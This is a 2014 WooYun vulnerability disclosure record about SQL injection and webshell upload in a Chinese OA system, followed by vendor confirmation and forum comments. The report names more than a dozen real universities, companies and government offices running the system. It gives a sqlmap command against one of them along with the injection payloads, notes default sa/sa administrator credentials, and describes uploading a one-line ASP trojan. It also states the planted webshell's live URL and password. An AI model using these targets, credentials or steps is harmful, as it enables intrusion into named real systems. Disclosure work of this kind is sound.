{"id": 981, "wybug_id": "wooyun-2014-067430", "wybug_title": "某OA系统SQL注射+后台getshell", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "超威蓝猫", "wybug_date": "2014-07-04 20:44", "wybug_open_date": "2014-10-02 20:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向公众公开  简要描述： 某OA系统SQL注射+后台getshell 第一次提交通用型漏洞 好紧张啊[拜拜] 详细说明：  列出几个能通过搜索引擎搜到的实例:\nhttp://oa.tjfsu.edu.cn/login.asp\t天津外国语大学http://vos.tjufe.edu.cn/login.asp\t天津财经大学http://www.shhjwl.com/vos/login.asp\t上海环境物流有限公司http://cqkyoa.oicp.net/login.asp\t科云建筑有限公司http://oa.hjshy.com/login.asp\t\t上海环境实业有限公司http://www.cnshuiyu.com/login.asp\t上海水域环境发展有限公司http://www.fzsyxx.com/oa/\t\t抚州市实验学校http://211.68.250.42/login.asp\t\t天津农学院http://211.68.192.21/login.asp\t\t天津音乐学院http://60.171.34.204:8086/\t\t淮南市行政管理执法局http://121.30.226.44/login.asp\t\t大同煤矿集团http://116.228.82.237/login.asp\t\t德林义肢http://180.166.7.94/login.asp\t\t上海市市容环境卫生汽车运输处\n【SQL注射】这套OA系统登陆页存在SQL注射，测试了几个发现后端均为MSSQL，且大部分可以--os-shell执行命令。注射点:\nhttp://VICTIM.COM/loginverify.asp\nPOST数据:\nDigest=&urlFrom=&username=admin&password=admin&Memo=1\nusername参数存在SQL注射。实例:\nsqlmap.py -u \"http://oa.tjfsu.edu.cn/loginverify.asp\" --data \"Digest=&urlFrom=&username=admin&password=admin&Memo=1\" -p username\n\nsqlmap identified the following injection points with a total of 90 HTTP(s) requests:---Place: POSTParameter: username    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: Digest=&urlFrom=&username=admin' AND 2836=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(120)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (2836=2836) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(103)+CHAR(108)+CHAR(100)+CHAR(113))) AND 'HQUn'='HQUn&password=admin&Memo=1    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: Digest=&urlFrom=&username=admin'; WAITFOR DELAY '0:0:5'--&password=admin&Memo=1    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: Digest=&urlFrom=&username=admin' WAITFOR DELAY '0:0:5'--&password=admin&Memo=1---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2005\nsqlmap --dbs后均可发现叫做\"HaiTianOA\"的库，其中的\"VO_UserInfor\"表储存了可用于登录的管理员的帐号与密码(多数有sa/sa。有的密码是明文的，有的是BASE64加密的)。请CNCERT自行验证更多实例。【后台getshell】以sa/sa登录上海市市容环境卫生汽车运输处(http://180.166.7.94/)为例登录后点击\"资讯内容维护\"-\"修改\"\n\n在编辑器中点击添加图片按钮，打开了\"http://VICTIM.COM/ckeditor/tupianadd.asp\"\n\n将一句话木马的后缀修改为.jpg 上传，抓包并去掉.jpg\n\n虽然返回HTTP500，但实际已经上传成功。\n\n拼接可得到一句话木马地址: http://180.166.7.94/file/images/20147408067349.asp 密码helo菜刀连接:\n\n   漏洞证明：  如上。上面仅各举一例作证明，请CNCERT自行验证更多   修复方案：  你们更专业^ ^   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-07-09 15:41 厂商回复： CNVD确认所述漏洞，（由上海交大协助完成验证），转由CNCERT向教育应急组织-赛尔网络公司通报，抄报CCERT。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-04 20:47 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:31        | 药药切克闹,充气娃娃迷幻药)\t\t \n  打破零回复     \n     2014-07-04 22:12 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  2条评论了已经    \n     2014-07-05 00:40 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  3楼是逗B    \n     2014-07-05 09:51 |    \t\tMoc \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:12        | 屌丝何苦为难屌丝)\t\t \n  力挺3楼    \n     2014-07-09 16:22 |    \t\tlosthacker \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:1        | 我是好人                    (PS:为什么...)\t\t \n  4楼说的好    \n     2014-08-09 22:47 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  原来是这个OA系统，库带已刷烂    \n     2014-08-10 00:55 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  ...谁说的3楼是逗B。。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}